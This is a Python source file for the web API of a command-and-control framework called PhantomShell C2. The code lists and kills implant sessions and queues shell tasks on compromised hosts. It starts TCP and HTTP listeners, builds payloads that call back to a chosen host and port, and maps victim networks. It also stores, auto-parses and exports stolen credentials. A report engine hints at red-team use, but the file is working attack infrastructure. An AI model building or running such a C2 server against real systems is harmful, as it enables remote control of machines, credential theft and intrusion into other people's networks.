"""PhantomShell C2 API server -- REST + WebSocket (Socket.IO) for the web dashboard."""

import logging
import os
import threading
import time
import uuid

from flask import Flask, jsonify, request, send_from_directory, Response
from flask_socketio import SocketIO, emit

from handlers.session import SessionManager
from handlers.credential_store import CredentialStore
from handlers.network_map import NetworkMap
from handlers.report_engine import ReportEngine
from handlers.agent_builder import AgentBuilder

log = logging.getLogger("phantom.c2.api")

# ---------------------------------------------------------------------------
# Shared state -- these are set by start_api_server() so the API operates on
# the same objects as the CLI.
# ---------------------------------------------------------------------------
_session_manager: SessionManager | None = None
_credential_store: CredentialStore | None = None
_network_map: NetworkMap | None = None
_report_engine: ReportEngine | None = None
_agent_builder: AgentBuilder | None = None
_listeners_ref: dict | None = None  # reference to PhantomC2.listeners

# Activity event log (ring buffer, last 200 events)
_events: list[dict] = []
_events_lock = threading.Lock()


def _add_event(event_type: str, data: dict):
    entry = {"type": event_type, "timestamp": time.time(),
             "id": uuid.uuid4().hex[:8], **data}
    with _events_lock:
        _events.append(entry)
        if len(_events) > 200:
            _events.pop(0)


def _recent_events(n: int = 50) -> list[dict]:
    with _events_lock:
        return list(reversed(_events[-n:]))


# ---------------------------------------------------------------------------
# Flask app + Socket.IO
# ---------------------------------------------------------------------------
DASHBOARD_DIR = os.path.join(os.path.dirname(__file__), "..", "dashboard")

app = Flask(__name__, static_folder=None)
app.config["SECRET_KEY"] = os.environ.get("PS_SECRET_KEY", uuid.uuid4().hex)

socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading",
                    logger=False, engineio_logger=False)


# ---------------------------------------------------------------------------
# Auth middleware
# ---------------------------------------------------------------------------
API_KEY = os.environ.get("PS_API_KEY", "")


def _check_auth() -> tuple[dict, int] | None:
    """Return an error tuple if auth fails, or None if OK."""
    if not API_KEY:
        return None  # no auth configured -- local use
    header = request.headers.get("Authorization", "")
    if header == f"Bearer {API_KEY}":
        return None
    return {"error": "Unauthorized", "code": 401}, 401


@app.before_request
def _auth_guard():
    # Static dashboard files and Socket.IO handshake are exempt
    if request.path.startswith("/socket.io") or not request.path.startswith("/api"):
        return None
    err = _check_auth()
    if err:
        return jsonify(err[0]), err[1]


# ---------------------------------------------------------------------------
# Error helpers
# ---------------------------------------------------------------------------
def _err(msg: str, code: int = 400):
    return jsonify({"error": msg, "code": code}), code


def _ok(data=None, code: int = 200):
    if data is None:
        data = {"status": "ok"}
    return jsonify(data), code


# ---------------------------------------------------------------------------
# Dashboard static file serving
# ---------------------------------------------------------------------------
@app.route("/")
def _index():
    return send_from_directory(DASHBOARD_DIR, "index.html")


@app.route("/<path:path>")
def _static(path):
    # Only serve files outside /api
    if path.startswith("api/"):
        return _err("Not found", 404)
    return send_from_directory(DASHBOARD_DIR, path)


# ===========================  SESSION ENDPOINTS  ===========================

@app.route("/api/sessions", methods=["GET"])
def api_list_sessions():
    return _ok(_session_manager.list_sessions())


@app.route("/api/sessions/<session_id>", methods=["GET"])
def api_get_session(session_id):
    s = _session_manager.get_session(session_id)
    if not s:
        return _err("Session not found", 404)
    return _ok(s.summary)


@app.route("/api/sessions/<session_id>/task", methods=["POST"])
def api_queue_task(session_id):
    body = request.get_json(silent=True) or {}
    command = body.get("command", "shell")
    args = body.get("args")
    raw = body.get("raw")
    timeout = body.get("timeout", 30)

    task_id = _session_manager.queue_task(session_id, command, args=args,
                                          raw=raw, timeout=timeout)
    if not task_id:
        return _err("Session not found", 404)

    _add_event("task_queued", {"session_id": session_id, "task_id": task_id,
                               "command": command})
    return _ok({"task_id": task_id}, 201)


@app.route("/api/sessions/<session_id>/responses", methods=["GET"])
def api_get_responses(session_id):
    s = _session_manager.get_session(session_id)
    if not s:
        return _err("Session not found", 404)
    # Return responses without consuming them so the CLI can still read them
    return _ok(list(s.responses))


@app.route("/api/sessions/<session_id>/kill", methods=["POST"])
def api_kill_session(session_id):
    task_id = _session_manager.queue_task(session_id, "exit")
    if not task_id:
        return _err("Session not found", 404)
    _add_event("session_killed", {"session_id": session_id})
    return _ok({"task_id": task_id, "status": "exit queued"})


@app.route("/api/sessions/<session_id>/sleep", methods=["POST"])
def api_update_sleep(session_id):
    body = request.get_json(silent=True) or {}
    sleep_val = body.get("sleep")
    jitter_val = body.get("jitter")

    if sleep_val is None and jitter_val is None:
        return _err("Provide 'sleep' and/or 'jitter'")

    args = {}
    if sleep_val is not None:
        args["sleep"] = int(sleep_val)
    if jitter_val is not None:
        args["jitter"] = int(jitter_val)

    task_id = _session_manager.queue_task(session_id, "sleep", args=args,
                                          raw=f"sleep {args}")
    if not task_id:
        return _err("Session not found", 404)
    return _ok({"task_id": task_id, "sleep": args})


# ===========================  LISTENER ENDPOINTS  ==========================

@app.route("/api/listeners", methods=["GET"])
def api_list_listeners():
    if _listeners_ref is None:
        return _ok([])
    result = []
    for key, listener in _listeners_ref.items():
        result.append({
            "id": key,
            "type": "http" if "http" in key else "tcp",
            "host": key.split(":")[0] if "://" not in key
                    else key.split("://")[1].split(":")[0],
            "port": int(key.rsplit(":", 1)[-1]),
            "status": "active",
        })
    return _ok(result)


@app.route("/api/listeners", methods=["POST"])
def api_start_listener():
    body = request.get_json(silent=True) or {}
    ltype = body.get("type", "tcp")
    host = body.get("host", "0.0.0.0")
    port = int(body.get("port", 4444))
    tls_cert = body.get("tls_cert")
    tls_key = body.get("tls_key")

    if _listeners_ref is None:
        return _err("Listener registry not available", 500)

    if ltype == "http":
        from listeners.http_listener import HttpListener
        key = f"http://{host}:{port}"
        if key in _listeners_ref:
            return _err(f"Listener already running on {key}", 409)
        use_tls = bool(tls_cert and tls_key)
        listener = HttpListener(host=host, port=port,
                                session_manager=_session_manager,
                                use_tls=use_tls, certfile=tls_cert,
                                keyfile=tls_key)
        listener.start()
        _listeners_ref[key] = listener
    else:
        from listeners.tcp_listener import TcpListener
        key = f"{host}:{port}"
        if key in _listeners_ref:
            return _err(f"Listener already running on {key}", 409)
        listener = TcpListener(host=host, port=port,
                               session_manager=_session_manager)
        listener.start()
        _listeners_ref[key] = listener

    _add_event("listener_started", {"id": key, "type": ltype,
                                     "host": host, "port": port})
    socketio.emit("listener_started", {"id": key, "type": ltype,
                                        "host": host, "port": port})
    return _ok({"id": key, "type": ltype, "host": host, "port": port}, 201)


@app.route("/api/listeners/<path:listener_id>", methods=["DELETE"])
def api_stop_listener(listener_id):
    if _listeners_ref is None or listener_id not in _listeners_ref:
        return _err("Listener not found", 404)
    _listeners_ref[listener_id].stop()
    del _listeners_ref[listener_id]
    _add_event("listener_stopped", {"id": listener_id})
    socketio.emit("listener_stopped", {"id": listener_id})
    return _ok({"status": "stopped", "id": listener_id})


# ==========================  CREDENTIAL ENDPOINTS  =========================

@app.route("/api/credentials", methods=["GET"])
def api_list_credentials():
    return _ok(_credential_store.list_all())


@app.route("/api/credentials", methods=["POST"])
def api_add_credential():
    body = request.get_json(silent=True) or {}
    required = ("source", "type", "username", "password")
    missing = [f for f in required if f not in body]
    if missing:
        return _err(f"Missing fields: {', '.join(missing)}")

    cred_id = _credential_store.add(
        source=body["source"],
        cred_type=body["type"],
        username=body["username"],
        password=body["password"],
        host=body.get("host", ""),
        database=body.get("database", ""),
    )
    cred = _credential_store.get(cred_id)
    _add_event("new_credential", {"id": cred_id, "username": body["username"]})
    socketio.emit("new_credential", cred)
    return _ok(cred, 201)


@app.route("/api/credentials/<cred_id>", methods=["DELETE"])
def api_delete_credential(cred_id):
    if not _credential_store.delete(cred_id):
        return _err("Credential not found", 404)
    return _ok({"status": "deleted", "id": cred_id})


@app.route("/api/credentials/export", methods=["GET"])
def api_export_credentials():
    csv_data = _credential_store.export_csv()
    return Response(csv_data, mimetype="text/csv",
                    headers={"Content-Disposition":
                             "attachment; filename=credentials.csv"})


# ==========================  BUILDER ENDPOINTS  ============================

@app.route("/api/builder/generate", methods=["POST"])
def api_generate_payload():
    body = request.get_json(silent=True) or {}
    required = ("language", "host", "port")
    missing = [f for f in required if f not in body]
    if missing:
        return _err(f"Missing fields: {', '.join(missing)}")

    result = _agent_builder.generate(
        language=body["language"],
        transport=body.get("transport", "tcp"),
        host=body["host"],
        port=int(body["port"]),
        sleep=int(body.get("sleep", 5)),
        jitter=int(body.get("jitter", 0)),
        kill_date=body.get("kill_date", ""),
        encrypt=body.get("encrypt", True),
        output_format=body.get("format", "raw"),
    )
    if "error" in result:
        return _err(result["error"])
    return _ok(result, 201)


# ==========================  NETWORK ENDPOINTS  ============================

@app.route("/api/network/hosts", methods=["GET"])
def api_list_hosts():
    return _ok(_network_map.get_hosts())


@app.route("/api/network/hosts", methods=["POST"])
def api_add_host():
    body = request.get_json(silent=True) or {}
    if "ip" not in body:
        return _err("Missing field: ip")
    host_id = _network_map.add_host(
        ip=body["ip"],
        hostname=body.get("hostname", ""),
        os=body.get("os", ""),
        ports=body.get("ports"),
        status=body.get("status", "alive"),
    )
    return _ok({"host_id": host_id}, 201)


@app.route("/api/network/graph", methods=["GET"])
def api_network_graph():
    return _ok(_network_map.get_graph())


# ==========================  REPORT ENDPOINTS  =============================

@app.route("/api/reports", methods=["GET"])
def api_list_reports():
    return _ok(_report_engine.list_reports())


@app.route("/api/reports/generate", methods=["POST"])
def api_generate_report():
    body = request.get_json(silent=True) or {}
    sessions = body.get("sessions", [])
    template = body.get("template", "technical")
    fmt = body.get("format", "html")

    if template not in ("executive", "technical", "findings"):
        return _err(f"Invalid template: {template}. "
                    f"Use: executive, technical, findings")
    if fmt not in ("html", "json"):
        return _err(f"Invalid format: {fmt}. Use: html, json")

    # If no sessions specified, include all
    if not sessions:
        sessions = [s["session_id"] for s in _session_manager.list_sessions()]

    report = _report_engine.generate(
        sessions=sessions,
        session_manager=_session_manager,
        credential_store=_credential_store,
        network_map=_network_map,
        template=template,
        fmt=fmt,
    )
    return _ok(report, 201)


@app.route("/api/reports/<report_id>", methods=["GET"])
def api_get_report(report_id):
    report = _report_engine.get_report(report_id)
    if not report:
        return _err("Report not found", 404)

    # For HTML reports, return the content directly with proper content-type
    if report["format"] == "html":
        return Response(report["content"], mimetype="text/html")
    return _ok(report)


# ==========================  STATS / EVENTS  ===============================

@app.route("/api/stats", methods=["GET"])
def api_stats():
    all_sessions = _session_manager.list_sessions()
    active = sum(1 for s in all_sessions if s["alive"])
    dead = len(all_sessions) - active

    return _ok({
        "active_sessions": active,
        "dead_sessions": dead,
        "listeners": len(_listeners_ref) if _listeners_ref else 0,
        "total_tasks": sum(s["pending_tasks"] for s in all_sessions),
        "total_creds": _credential_store.count,
    })


@app.route("/api/events", methods=["GET"])
def api_events():
    return _ok(_recent_events(50))


# ==========================  SOCKET.IO EVENTS  =============================

# Client -> Server handlers

@socketio.on("connect")
def _ws_connect():
    log.info("[*] Dashboard client connected via WebSocket")


@socketio.on("disconnect")
def _ws_disconnect():
    log.info("[*] Dashboard client disconnected")


@socketio.on("send_task")
def _ws_send_task(data):
    """Client sends a task: {session_id, command, args, raw}"""
    session_id = data.get("session_id")
    command = data.get("command", "shell")
    args = data.get("args")
    raw = data.get("raw")

    if not session_id:
        emit("error", {"error": "session_id required"})
        return

    task_id = _session_manager.queue_task(session_id, command, args=args, raw=raw)
    if task_id:
        _add_event("task_queued", {"session_id": session_id, "task_id": task_id})
        emit("task_queued", {"session_id": session_id, "task_id": task_id})
    else:
        emit("error", {"error": f"Session not found: {session_id}"})


@socketio.on("start_listener")
def _ws_start_listener(data):
    """Client starts a listener: {type, host, port}"""
    ltype = data.get("type", "tcp")
    host = data.get("host", "0.0.0.0")
    port = int(data.get("port", 4444))

    if _listeners_ref is None:
        emit("error", {"error": "Listener registry not available"})
        return

    try:
        if ltype == "http":
            from listeners.http_listener import HttpListener
            key = f"http://{host}:{port}"
            if key in _listeners_ref:
                emit("error", {"error": f"Already running on {key}"})
                return
            listener = HttpListener(host=host, port=port,
                                    session_manager=_session_manager)
            listener.start()
            _listeners_ref[key] = listener
        else:
            from listeners.tcp_listener import TcpListener
            key = f"{host}:{port}"
            if key in _listeners_ref:
                emit("error", {"error": f"Already running on {key}"})
                return
            listener = TcpListener(host=host, port=port,
                                   session_manager=_session_manager)
            listener.start()
            _listeners_ref[key] = listener

        _add_event("listener_started", {"id": key, "type": ltype})
        socketio.emit("listener_started", {"id": key, "type": ltype,
                                            "host": host, "port": port})
    except Exception as exc:
        emit("error", {"error": str(exc)})


@socketio.on("stop_listener")
def _ws_stop_listener(data):
    """Client stops a listener: {id}"""
    lid = data.get("id")
    if not lid or _listeners_ref is None or lid not in _listeners_ref:
        emit("error", {"error": "Listener not found"})
        return
    _listeners_ref[lid].stop()
    del _listeners_ref[lid]
    _add_event("listener_stopped", {"id": lid})
    socketio.emit("listener_stopped", {"id": lid})


# ==========================  BACKGROUND POLLER  ============================
# Polls the SessionManager every 2 seconds and pushes real-time updates to
# all connected dashboard clients via Socket.IO.

_prev_session_ids: set[str] = set()
_prev_alive: dict[str, bool] = {}


def _background_poller():
    """Emit beacon_update and stats_update events on a 2-second loop."""
    global _prev_session_ids, _prev_alive

    while True:
        try:
            sessions = _session_manager.list_sessions()
            current_ids = {s["session_id"] for s in sessions}

            # Detect new connections
            for s in sessions:
                sid = s["session_id"]
                if sid not in _prev_session_ids:
                    socketio.emit("agent_connected", {
                        "session_id": sid,
                        "agent_id": s["agent_id"],
                        "hostname": s["hostname"],
                        "username": s["username"],
                        "os": s["os"],
                        "agent_type": s["agent_type"],
                    })
                    _add_event("agent_connected", {"session_id": sid,
                                                    "hostname": s["hostname"]})

                # Detect disconnections
                was_alive = _prev_alive.get(sid, True)
                if was_alive and not s["alive"]:
                    socketio.emit("agent_disconnected", {"session_id": sid})
                    _add_event("agent_disconnected", {"session_id": sid})

                _prev_alive[sid] = s["alive"]

            _prev_session_ids = current_ids

            # Broadcast beacon updates for every active session
            for s in sessions:
                if s["alive"]:
                    sess_obj = _session_manager.get_session(s["session_id"])
                    socketio.emit("beacon_update", {
                        "session_id": s["session_id"],
                        "last_beacon": s["last_beacon"],
                        "cwd": sess_obj.info.get("cwd", "") if sess_obj else "",
                        "username": s["username"],
                        "integrity": s.get("integrity", "?"),
                    })

            # Check for new responses and emit task_response + parse creds
            for s in sessions:
                sess_obj = _session_manager.get_session(s["session_id"])
                if not sess_obj:
                    continue
                for resp in sess_obj.responses:
                    resp_id = resp.get("task_id", "")
                    # Only emit once -- tag processed responses
                    if resp.get("_api_emitted"):
                        continue
                    resp["_api_emitted"] = True

                    socketio.emit("task_response", {
                        "session_id": s["session_id"],
                        "task_id": resp_id,
                        "status": resp.get("status", "?"),
                        "output": resp.get("output", ""),
                        "error": resp.get("error", ""),
                        "data": resp.get("data"),
                    })

                    # Auto-parse credentials from steal_* output
                    new_creds = _credential_store.parse_response(
                        s["session_id"], resp)
                    for cid in new_creds:
                        cred = _credential_store.get(cid)
                        if cred:
                            socketio.emit("new_credential", cred)

                    # Auto-discover hosts from scan output
                    _network_map.auto_discover([resp])

            # Broadcast aggregate stats
            active = sum(1 for s in sessions if s["alive"])
            dead = len(sessions) - active
            socketio.emit("stats_update", {
                "active": active,
                "dead": dead,
                "listeners": len(_listeners_ref) if _listeners_ref else 0,
                "tasks": sum(s["pending_tasks"] for s in sessions),
                "creds": _credential_store.count,
            })

        except Exception as exc:
            log.debug(f"[!] Poller error: {exc}")

        time.sleep(2)


# ==========================  PUBLIC ENTRY POINT  ===========================

def start_api_server(session_manager: SessionManager,
                     listeners: dict,
                     host: str = "0.0.0.0",
                     port: int = 5000,
                     credential_store: CredentialStore | None = None,
                     network_map_inst: NetworkMap | None = None):
    """Launch the API server in a background thread.

    Called from PhantomC2.do_dashboard() so the CLI remains interactive.
    """
    global _session_manager, _credential_store, _network_map
    global _report_engine, _agent_builder, _listeners_ref

    _session_manager = session_manager
    _listeners_ref = listeners
    _credential_store = credential_store or CredentialStore()
    _network_map = network_map_inst or NetworkMap()
    _report_engine = ReportEngine()
    _agent_builder = AgentBuilder()

    # Start the background poller thread
    poller = threading.Thread(target=_background_poller, daemon=True,
                              name="api-poller")
    poller.start()

    # Run Flask-SocketIO in a daemon thread so it does not block the CLI
    server_thread = threading.Thread(
        target=lambda: socketio.run(app, host=host, port=port,
                                    use_reloader=False, log_output=False),
        daemon=True,
        name="api-server",
    )
    server_thread.start()
    log.info(f"[+] API server started on http://{host}:{port}")
    return server_thread
